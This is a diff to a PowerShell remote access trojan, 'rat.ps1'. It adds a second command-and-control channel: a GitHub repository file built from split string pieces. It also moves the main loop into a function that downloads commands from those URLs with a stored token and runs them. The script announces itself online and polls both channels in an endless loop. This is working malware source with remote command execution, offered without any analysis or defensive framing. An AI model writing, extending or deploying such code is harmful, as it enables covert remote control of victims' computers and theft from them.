@@ -10,6 +10,7 @@ $S=Join-Path $env:TEMP 'r_s.tmp'
 $script:P=2000
 $L='1523845613177929828'
 $HF=Join-Path $env:TEMP 'rat_hook.txt'
+$CG='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
 
 # ---- dedup: exit if another rat.ps1 is already running ----
 try{
@@ -450,14 +451,13 @@ if(Test-Path $HF){
 }
 
 # ---- main loop ----
-Post '`[+] rat online`' 
-while($true){
+function Poll-Run($url){
   try{
     $wc=New-Object Net.WebClient
     $wc.Headers.Add('User-Agent','Mozilla/5.0')
     $wc.Headers.Add('Accept','application/vnd.github.raw')
     $wc.Headers.Add('Authorization','token '+$T)
-    $remote=$wc.DownloadString($C).Trim()
+    $remote=$wc.DownloadString($url).Trim()
     $wc.Dispose()
     $i=$remote.IndexOf('|')
     if($i -ge 0){ $cmd=$remote.Substring(0,$i).Trim(); $nonce=$remote.Substring($i+1).Trim() }
@@ -470,5 +470,10 @@ while($true){
       Run-Cmd $cmd
     }
   }catch{}
+}
+Post '`[+] rat online`'
+while($true){
+  Poll-Run $C
+  if($C -ne $CG){ Poll-Run $CG }
   Start-Sleep -Milliseconds $script:P
 }
